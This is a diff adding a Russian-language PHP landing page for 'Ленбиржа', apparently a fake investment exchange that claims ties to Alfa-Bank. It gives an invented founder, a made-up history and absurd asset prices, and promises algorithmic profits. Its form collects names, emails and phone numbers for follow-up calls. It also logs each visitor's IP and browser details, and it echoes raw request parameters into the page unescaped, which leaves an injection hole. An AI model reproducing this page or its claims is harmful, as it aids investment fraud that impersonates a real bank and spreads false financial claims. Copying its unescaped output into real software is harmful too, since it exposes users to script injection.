@@ -1,0 +1,647 @@
+<?php
+	$FacebookPixel = $_GET['p'];
+	$Ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
+	$http_lang = substr($_SERVER["HTTP_ACCEPT_LANGUAGE"],0,2);
+	$fd = fopen("../logs.txt", 'a+');
+	$date = date('d.m.Y, H:i:s');
+	$arr = $date.'|'.$_SERVER['HTTP_CF_IPCOUNTRY'].'|'.$http_lang.'|'.$_SERVER['HTTP_REFERER'].'|'.$_SERVER['HTTP_USER_AGENT'].'|'.$Ip."|land \r\n";
+	fwrite($fd, $arr);
+	fclose($fd);
+	$gp = $_GET['gp'];
+  $hs = $_GET['hs'];
+  $page_lang = "ru";
+	$QUERY=$_SERVER["QUERY_STRING"];
+?>
+<!DOCTYPE html>
+<html lang="<?php echo $page_lang; ?>">
+<!-- <html lang="ru"> -->
+
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+
+  <!-- <link rel="stylesheet" href="./fonts/stylesheet.css" /> -->
+
+  <link rel="stylesheet" href="https://usahomerelief.net/adict/intlTelInput.css" />
+  <link rel="stylesheet" href="https://usahomerelief.net/adict/adict.css" />
+
+  <title>Ленбиржа</title>
+<link href="assets/css/styles.004dd8102ce0aacc964f.css" rel="stylesheet"></head>
+
+<body class="page">
+  <section class="header">
+  <div class="container">
+    <svg class="header__logo">
+      <use href="assets/img/08f7611b78358b7c9e4e.svg#icon-logo"></use>
+    </svg>
+
+    <div class="header__menu">
+      <p class="header__menu-item scroll-btn-two">Про биржу</p>
+      <button type="button" class="header__menu-btn scroll-btn">Регистрация</button>
+    </div>
+  </div>
+
+  <div class="marquee">
+    <div>
+      <span class="marquee__first-part">LKOH</span><span class="marquee__second-part">12.2174</span><span class="marquee__third-part">-0,06%</span>
+
+      <span class="marquee__first-part">DJIA</span><span class="marquee__second-part">35490.69</span><span class="marquee__third-part">-0.74</span>
+
+      <span class="marquee__first-part">NASD_COMP</span><span class="marquee__second-part">15235.84</span><span class="marquee__third-part--plus">+0.00</span>
+
+      <span class="marquee__first-part">SP500</span><span class="marquee__second-part">4564.11</span><span class="marquee__third-part--plus">+0.27</span>
+
+      <span class="marquee__first-part">NASD100</span><span class="marquee__second-part">15598.39</span><span class="marquee__third-part--plus">+0.25</span>
+
+      <span class="marquee__first-part">FTSE100</span><span class="marquee__second-part">FTSE100</span><span class="marquee__third-part">-0.23</span>
+
+      <span class="marquee__first-part">DAX</span><span class="marquee__second-part">15662.72</span><span class="marquee__third-part">-0.23</span>
+
+      <span class="marquee__first-part">GAZ</span><span class="marquee__second-part">10.097</span><span class="marquee__third-part">-1.85</span>
+
+      <span class="marquee__first-part">ROS</span><span class="marquee__second-part">8.935</span><span class="marquee__third-part">-0.69</span>
+
+      <span class="marquee__first-part">Золото</span><span class="marquee__second-part">1802.10</span><span class="marquee__third-part--plus">+0.30</span>
+    </div>
+  </div>
+</section>
+    <section class="first">
+  <div class="container">
+    <div class="first__desk-box">
+      <img src="assets/img/dfe2588a4dab316e32d0.png" alt="котировки" class="first__img-desk">
+      <div class="first__desktop-flex">
+        <h1 class="first__title">
+          Ничего не понятно,
+          <span class="first__title--part"><br>а зарабатывать хочется?</span>
+        </h1>
+        <img src="assets/img/f9d683df75f37434200d.png" alt="котировки" class="first__img">
+        <p class="first__text">
+          Чтобы делать деньги, не нужно быть специалистом
+        </p>
+        <p class="first__text">
+          <span class="first__text--part">ЛЕНБИРЖА</span> — простая и понятная
+          альтернатива Мосбирже
+          <span class="first__text--part">от создателей Альфа-Банк</span>
+        </p>
+      </div>
+    </div>
+
+    <form method="POST" action="thanks/index.php" class="form" id="form">
+      <h2 class="form__title">
+        <span class="form__title--part">Отправь нам заявку</span> и расскажи
+        родным, что ты теперь <span class="form__title--part">инвестор</span>
+      </h2>
+      <div class="input_wrapper">
+        <div>
+          <input name="f_name" placeholder="Ваше имя">
+        </div>
+        <div>
+          <input name="l_name" placeholder="Ваша фамилия">
+        </div>
+        <div>
+          <input type="email" name="email" placeholder="Ваш e-mail">
+        </div>
+        <style>
+          .iti__flag-container {
+            z-index: 50;
+          }
+
+          .iti-mobile .iti__country-list {
+            width: 85%;
+          }
+        </style>
+        <input type="tel" name="phone" placeholder="Ваш телефон" autocomplete="off" required>
+        <input type="hidden" name="phone2" class="phone2" autocomplete="off" required>
+        
+        <input type="hidden" name="pixel_id" value="<?php echo $FacebookPixel?>">
+        <input type="hidden" name="page_lang" value="<?php echo $page_lang?>">
+        <input type="hidden" name="query" value="<?php echo $QUERY?>">
+        <input type="hidden" name="gp_id" value="<?php echo $gp?>">
+        <input type="hidden" name="hs_id" value="<?php echo $hs?>">
+        
+        <input type="hidden" name="landing" value="LENBYRJA">
+        <button class="form__btn" type="submit">
+          Инвестируй и зарабатывай
+        </button>
+      </div>
+    </form>
+  </div>
+</section>
+      <section class="second" id="form2">
+  
+  <div id="myCarousel" class="carousel slide second__slide-mob" data-bs-ride="carousel">
+    <div class="carousel-inner">
+      <div class="carousel-item active">
+        <img src="assets/img/160c4f43759be2951dd3.png" class="d-block w-100" alt="...">
+      </div>
+      <div class="carousel-item">
+        <img src="assets/img/1228c303cd6ab33c239b.png" class="d-block w-100" alt="...">
+      </div>
+      <div class="carousel-item">
+        <img src="assets/img/9f5e687a69485ee9c4e3.png" class="d-block w-100" alt="...">
+      </div>
+      <div class="carousel-item">
+        <img src="assets/img/090293cabd295946f5fb.png" class="d-block w-100" alt="...">
+      </div>
+    </div>
+  </div>
+
+  
+  <div class="container second__slide-desk">
+    <div id="myCarousel" class="carousel slide" data-bs-ride="carousel">
+      <div class="carousel-inner">
+        <div class="carousel-item active">
+          <img src="assets/img/1371289259c30da6e0f3.png" class="d-block w-100" alt="...">
+        </div>
+        <div class="carousel-item">
+          <img src="assets/img/3f1966973046d5a1ce21.png" class="d-block w-100" alt="...">
+        </div>
+        <div class="carousel-item">
+          <img src="assets/img/d57a2205a9a638391007.png" class="d-block w-100" alt="...">
+        </div>
+        <div class="carousel-item">
+          <img src="assets/img/8cda6cd8bc0d05b19f92.png" class="d-block w-100" alt="...">
+        </div>
+      </div>
+    </div>
+  </div>
+</section>
+
+        <section class="third">
+  <div class="container">
+    <h2 class="third__title">Как работает ленбиржа?</h2>
+
+    <ul class="third__list">
+      <li class="third__list-item">
+        <svg class="third__list-item-img">
+          <use href="assets/img/08f7611b78358b7c9e4e.svg#icon-robot"></use>
+        </svg>
+        <div class="third__list-item-box">
+          <h4 class="third__list-item-title">Расчетами займется робот</h4>
+          <p class="third__list-item-text">
+            Биржевые позиции на Ленбирже закрываются автоматически благодаря
+            алгоритму Альфа-Банка
+          </p>
+        </div>
+      </li>
+      <li class="third__list-item">
+        <svg class="third__list-item-img">
+          <use href="assets/img/08f7611b78358b7c9e4e.svg#icon-graphic"></use>
+        </svg>
+        <div class="third__list-item-box">
+          <h4 class="third__list-item-title">Выбери готовую стратегию</h4>
+          <p class="third__list-item-text">
+            Вместо того, чтобы вручную собирать портфель инвестора и изучать
+            тонны литературы
+          </p>
+        </div>
+      </li>
+      <li class="third__list-item">
+        <svg class="third__list-item-img">
+          <use href="assets/img/08f7611b78358b7c9e4e.svg#icon-head"></use>
+        </svg>
+        <div class="third__list-item-box">
+          <h4 class="third__list-item-title">Инвестируй и зарабатывай</h4>
+          <p class="third__list-item-text">
+            На Ленбирже — это просто. Покупаешь акции. Запускаешь алгоритм.
+            Получаешь прибыль
+          </p>
+        </div>
+      </li>
+    </ul>
+  </div>
+</section>
+
+          <section class="fourth">
+  <div class="container">
+    <h2 class="fourth__title">Твой шанс стать инвестором</h2>
+    <p class="fourth__text">
+      Торгуй всем — от криптовалют до акций мировых гигантов
+    </p>
+    <p class="fourth__text-two">Перед тобой выбор из сотен различных активов</p>
+
+    
+    <table>
+      <thead>
+        <tr>
+          <th>
+            <span class="th__after" id="th__after-one">Актив</span>
+          </th>
+          <th>
+            <span class="th__after" id="th__after-two">Последняя сделка ($)</span>
+          </th>
+          <th>
+            <span class="th__after" id="th__after-three">Изменение за 24 часа</span>
+          </th>
+          <th>
+            <span class="th__after" id="th__after-four">Суточная прибыль
+              <span class="th-part">(в % от депозита)</span></span>
+          </th>
+        </tr>
+      </thead>
+
+      <tbody>
+        <tr>
+          <td>Газпром</td>
+          <td>$722</td>
+          <td class="active">+2,72%</td>
+          <td>+2,72%</td>
+        </tr>
+        <tr>
+          <td>Лукойл</td>
+          <td>$388</td>
+          <td>+1,28%</td>
+          <td>+1,28%</td>
+        </tr>
+        <tr>
+          <td>СБЕР</td>
+          <td>$212</td>
+          <td style="color: red">-3,13%</td>
+          <td>-3,13%</td>
+        </tr>
+        <tr>
+          <td>МТС</td>
+          <td>$87</td>
+          <td>+1,99%</td>
+          <td>+1,99%</td>
+        </tr>
+        <tr>
+          <td>Яндекс</td>
+          <td>$71</td>
+          <td style="color: red">-1,72%</td>
+          <td>-1,72%</td>
+        </tr>
+        <tr>
+          <td>Tesla</td>
+          <td>$115</td>
+          <td>+5,24%</td>
+          <td>+5,24%</td>
+        </tr>
+        <tr>
+          <td>Moderna</td>
+          <td>$427</td>
+          <td>+7,11%</td>
+          <td>+7,11%</td>
+        </tr>
+        <tr>
+          <td>Facebook</td>
+          <td>$811</td>
+          <td style="color: red">-3,80%</td>
+          <td>-3,80%</td>
+        </tr>
+        <tr>
+          <td>Apple</td>
+          <td>$302</td>
+          <td style="color: red">-4,77%</td>
+          <td>-4,77%</td>
+        </tr>
+        <tr>
+          <td>NVIDIA</td>
+          <td>$88</td>
+          <td>+9,09%</td>
+          <td>+9,09%</td>
+        </tr>
+        <tr>
+          <td>Amazon</td>
+          <td>$192</td>
+          <td>+0,93%</td>
+          <td>+0,93%</td>
+        </tr>
+        <tr>
+          <td>Pfizer</td>
+          <td>$515</td>
+          <td>+12,24%</td>
+          <td>+12,24%</td>
+        </tr>
+        <tr>
+          <td>Boeing</td>
+          <td>$62</td>
+          <td style="color: red">-2,20%</td>
+          <td>-2,20%</td>
+        </tr>
+        <tr>
+          <td>Activision</td>
+          <td>$370</td>
+          <td>+8,34%</td>
+          <td>+8,34%</td>
+        </tr>
+        <tr>
+          <td>Bitcoin</td>
+          <td>$629</td>
+          <td style="color: red">-4,56%</td>
+          <td>-4,56%</td>
+        </tr>
+        <tr>
+          <td>Ethereum</td>
+          <td>$50</td>
+          <td style="color: red">-1,50%</td>
+          <td>-1,50%</td>
+        </tr>
+        <tr>
+          <td>Ripple</td>
+          <td>$228</td>
+          <td>+8,23%</td>
+          <td>+8,23%</td>
+        </tr>
+        <tr>
+          <td rowspan="4" class="table-link-box" style="text-align: center">
+            <span class="table-link scroll-btn">еще 471 актив</span>
+          </td>
+        </tr>
+      </tbody>
+    </table>
+  </div>
+</section>
+
+            <section class="fifth" id="fifth">
+  <div class="container">
+    <div class="fifth__desk-flex">
+      <div class="fifth__img-mob">
+        <img src="assets/img/83d6d7bc21f0768159e5.png" alt="мужчина в очках" class="fifth__img">
+        <p class="fifth__img-title">Владимир Верхошинский</p>
+        <p class="fifth__img-text">Глава Альфа-Банка, основатель Ленбиржи</p>
+      </div>
+      <div class="fifth__desk-box">
+        <p>
+        </p><figure class="fifth__img-desk">
+          <img src="assets/img/fe282b4bba81e03ff207.png" alt="мужчина в очках">
+          <figcaption class="fifth__img-title">Владимир Верхошинский</figcaption>
+          <figcaption class="fifth__img-text">Глава Альфа-Банка, основатель Ленбиржи</figcaption>
+        </figure>
+        <b>Группа "Ленбиржа"</b> включает в себя ПАО Санкт-Петербуржская
+        биржа, которое управляет второй в России многофункциональной биржевой
+        площадкой по торговле акциями, облигациями, производными
+        инструментами, валютой, инструментами денежного рынка и товарами. В
+        состав Группы также входит центральный депозитарий (НКО АО
+        "Национальный расчетный депозитарий"), а также клиринговый центр (НКО
+        НКЦ (АО)), выполняющий функции центрального контрагента на рынках, что
+        позволяет Ленбирже оказывать клиентам полный цикл торговых и
+        пост-трейдинговых услуг.
+        <br>
+        <br>
+        Ленбиржа была образована в октябре 2021 года в результате слияния двух
+        основных российских биржевых групп — Группы ММВБ (год основания 1992)
+        и Группы РТС (год основания 1995). Возникшая в результате слияния
+        вертикально интегрированная структура, обеспечивающая возможность
+        торговли всеми основными категориями активов, была переименована в
+        Ленбиржу. Ленбиржа провела первичное публичное размещение своих акций
+        27 июля 2021 года на собственной торговой площадке (торговый код
+        LEEX).
+        <br>
+        <br>
+        На <b>фондовом рынке</b> Ленбиржи проводятся торги акциями,
+        облигациями федерального займа (ОФЗ), региональными и корпоративными
+        облигациями, суверенными и корпоративными еврооблигациями,
+        депозитарными расписками, инвестиционными паями, ипотечными
+        сертификатами участия и биржевыми инвестиционными фондами (Exchange
+        Traded Funds — ETF).
+        <br>
+        <br>
+        На <b>срочном рынке</b> Ленбиржи обращаются: фьючерсные контракты на
+        индексы (Индекс Ленбиржи, индекс РТС, индекс волатильности RVI);
+        фьючерсы на российские и иностранные акции, ОФЗ и еврооблигации
+        Россия-30, валютные пары, процентные ставки; контракты на драгоценные
+        металлы (золото, серебро, платина, палладий, медь); фьючерсы на нефть
+        и сахар; опционные контракты на некоторые из этих фьючерсов.
+        <br>
+        <br>
+        На <b>валютном рынке</b> Ленбиржи ведутся торги следующими валютами:
+        долларом США (USD), евро (EUR), китайским юанем (CNY), британским
+        фунтом (GBP), гонконгским долларом (HKD), украинской гривной (UAH),
+        казахским тенге (KZT) и белорусским рублем (BYR). Основными валютными
+        парами являются USD/RUB и EUR/RUB. Средневзвешенное значение на 11:30
+        мск валютной пары USD/RUB с расчетами "завтра" используется Банком
+        России для определения официального курса доллара США.
+        <br>
+        <br>
+        На <b>денежном рынке</b> Ленбиржа предоставляет сервис репо следующих
+        типов: репо с ЦК, междилерское репо, прямое репо с Альфа-Банк, репо с
+        системой управления обеспечением. Кроме того, доступны
+        депозитно-кредитные операции, организаторами которых выступают
+        Альфа-Банк, Пенсионный фонд России, Федеральное казначейство России,
+        Внешэкономбанк и др.
+        <br>
+        <br>
+        Проводятся торги <b>золотом и серебром.</b> На платформе
+        <b>АО "Ленбиржа"</b>, которое является уполномоченной биржей
+        Минсельхоза России, осуществляются государственные закупочные
+        интервенции на рынке зерна.
+        <br>
+        <br>
+        Кроме торговых сервисов, Группа "Ленинградская Биржа" предлагает
+        клиентам весь комплекс клиринговых и расчетно-депозитарных услуг.
+        Клиринговые услуги предоставляются участникам торгов
+        <b>Небанковская кредитная организация-центральный контрагент
+          "Национальный Клиринговый Центр" (Акционерное общество)</b>
+        (НКО НКЦ (АО)), который выполняет функции центрального контрагента на
+        всех рынках Ленбиржи. НКО НКЦ (АО) — единственный квалифицированный ЦК
+        в России, этот статус был присвоен ему Банком России в 2013 году, а с
+        2014 года НКО НКЦ (АО) является также системно значимым центральным
+        контрагентом.
+        <br>
+        <br>
+        Расчетно-депозитарные услуги в Группе предоставляются
+        <b>Национальным расчетным депозитарием (НРД)</b>. НРД — центральный
+        депозитарий Российской Федерации. В 2014 году Банк России признал НРД
+        системно значимой организацией в нескольких категориях: "центральный
+        депозитарий", "расчетный депозитарий" и "репозитарий", — а также
+        присвоил ему статус национально значимой платежной системы.
+        <br>
+        <br>
+        Группа также предлагает клиентам
+        <b>информационные продукты и технологические сервисы</b>.
+        Информационные продукты включают как рыночные данные в режиме
+        реального времени, так и информацию об итогах торгов и индексах.
+        <br>
+        <br>
+        Ленбиржа активно содействует развитию российского финансового рынка,
+        его инфраструктуры, совершенствует технологии и повышает
+        привлекательность своих торговых площадок и сервисов для отечественных
+        и зарубежных инвесторов и эмитентов.
+
+        <p></p>
+      </div>
+      <span class="toggle-btn">Узнать больше</span>
+    </div>
+  </div>
+</section>
+              <section class="sixth">
+  <div class="container">
+    <div class="sixth__box">
+      <h2 class="sixth__title">Мы не оставим тебя одного</h2>
+      <p class="sixth__text">
+        Сразу после регистрации за тобой будет закреплен наставник.
+      </p>
+      <p class="sixth__text">
+        Он простым и понятным языком докажет, что инвестиции — это просто!
+      </p>
+    </div>
+    <img src="assets/img/283da11a48e75e09c852.png" alt="преподаватель возле доски" class="sixth__img-mob">
+    <img src="assets/img/442363df471b4f771c80.png" alt="преподаватель возле доски" class="sixth__img-desk">
+  </div>
+</section>
+
+                <section class="seventh">
+  <div class="container">
+    <h2 class="seventh__title">Ты узнаешь:</h2>
+
+    <ul class="seventh__list">
+      <li class="seventh__list-item">
+        <svg class="seventh__list-item-img">
+          <use href="assets/img/08f7611b78358b7c9e4e.svg#icon-rocket"></use>
+        </svg>
+        <h4 class="seventh__list-item-title">С чего вообще начать</h4>
+      </li>
+      <li class="seventh__list-item">
+        <svg class="seventh__list-item-img">
+          <use href="assets/img/08f7611b78358b7c9e4e.svg#icon-mishen"></use>
+        </svg>
+        <h4 class="seventh__list-item-title">Как выбрать стратегию</h4>
+      </li>
+      <li class="seventh__list-item">
+        <svg class="seventh__list-item-img">
+          <use href="assets/img/08f7611b78358b7c9e4e.svg#icon-bag"></use>
+        </svg>
+        <h4 class="seventh__list-item-title">
+          Как сформировать портфель инвестора
+        </h4>
+      </li>
+    </ul>
+  </div>
+</section>
+
+                  <section class="eighth">
+  <div class="container">
+    
+    <div class="eighth__quest-one eighth__quest active">
+      <p class="eighth__quest-num">Вопрос 1 из 3</p>
+      <h3 class="eighth__quest-title">
+        Сколько времени ты сможешь уделять торговле на Ленбирже в день?
+      </h3>
+      <ul class="eighth__ans-list">
+        <li class="eighth__ans-item">15 минут</li>
+        <li class="eighth__ans-item">1 час</li>
+        <li class="eighth__ans-item">30 минут</li>
+      </ul>
+    </div>
+
+    <div class="eighth__quest-two eighth__quest">
+      <p class="eighth__quest-num">Вопрос 2 из 3</p>
+      <h3 class="eighth__quest-title">
+        На каком активе, на твой взгляд, сейчас заработать проще всего?
+      </h3>
+      <ul class="eighth__ans-list">
+        <li class="eighth__ans-item eighth__ans-width">Акции</li>
+        <li class="eighth__ans-item eighth__ans-width">Валюта</li>
+        <li class="eighth__ans-item eighth__ans-width">Ценные металлы</li>
+        <li class="eighth__ans-item eighth__ans-width">Нефть и газ</li>
+      </ul>
+    </div>
+
+    <div class="eighth__quest-three eighth__quest">
+      <p class="eighth__quest-num">Вопрос 3 из 3</p>
+      <h3 class="eighth__quest-title">
+        На каком активе, на твой взгляд, сейчас заработать проще всего?
+      </h3>
+      <ul class="eighth__ans-list">
+        <li data-variant="0" class="eighth__ans-item">$250</li>
+        <li data-variant="1" class="eighth__ans-item">$1000</li>
+        <li data-variant="2" class="eighth__ans-item">$10000</li>
+      </ul>
+    </div>
+
+    
+    <div class="eighth__res-one eighth__res">
+      <h3 class="eighth__res-title">Новичок</h3>
+      <p class="eighth__res-text">
+        Заполняй регистрационную форму и обязательно дождись звонка консультанта
+        Ленбиржи для подтверждения
+      </p>
+      <button type="button" class="eighth__res-btn scroll-btn">
+        СОЗДАТЬ БРОКЕРСКИЙ СЧЕТ
+      </button>
+    </div>
+
+    <div class="eighth__res-two eighth__res">
+      <h3 class="eighth__res-title">Опытный</h3>
+      <p class="eighth__res-text">
+        Заполняй регистрационную форму и обязательно дождись звонка консультанта
+        Ленбиржи для подтверждения
+      </p>
+      <button type="button" class="eighth__res-btn scroll-btn">
+        СОЗДАТЬ БРОКЕРСКИЙ СЧЕТ
+      </button>
+    </div>
+
+    <div class="eighth__res-three eighth__res">
+      <h3 class="eighth__res-title">Инвестор</h3>
+      <p class="eighth__res-text">
+        Заполняй регистрационную форму и обязательно дождись звонка консультанта
+        Ленбиржи для подтверждения
+      </p>
+      <button type="button" class="eighth__res-btn scroll-btn">
+        СОЗДАТЬ БРОКЕРСКИЙ СЧЕТ
+      </button>
+    </div>
+  </div>
+</section>
+
+                    <footer class="footer">
+  <div class="container">
+    <p class="footer__text">
+      Copyright © Ленбиржа, 2021. Все права на информацию и аналитические
+      материалы, размещенные на настоящем сайте Биржи, защищены в соответствии с
+      российским законодательством. Воспроизведение, распространение и иное
+      использование информации, размещенной на сайте Биржи, или ее части
+      допускается только с предварительного письменного согласия Биржи.
+    </p>
+  </div>
+</footer>
+
+
+                      <script src="./assets/js/jquery-3.5.1.min.js"></script>
+                      <script src="https://usahomerelief.net/adict/intlTelInput.js"></script>
+                      <script src="https://usahomerelief.net/adict/adict.js"></script>
+                      <script src="https://usahomerelief.net/adict/utils.js"></script>
+                      <script src="https://usahomerelief.net/video/video.js"></script>
+
+                      <script src="./assets/js/bootstrap.bundle.min.js"></script>
+
+                      <script>
+                        $(".scroll-btn").each(function () {
+                          $(this).click((e) => {
+                            e.preventDefault();
+                            $("html").animate(
+                              {
+                                scrollTop: $("#form").offset().top,
+                              },
+                              800
+                            );
+                          });
+                        });
+                      </script>
+
+                      <script>
+                        $(".scroll-btn-two").each(function () {
+                          $(this).click((e) => {
+                            e.preventDefault();
+                            $("html").animate(
+                              {
+                                scrollTop: $("#fifth").offset().top,
+                              },
+                              800
+                            );
+                          });
+                        });
+                      </script>
+
+                      <script>
+                        var myCarousel = document.querySelector("#myCarousel");
+                        var carousel = new bootstrap.Carousel(myCarousel, {
+                          interval: 4000,
+                          wrap: true,
+                        });
+                      </script>
+<script defer src="assets/js/index.004dd8102ce0aacc964f.js"></script></body>
+
+</html>
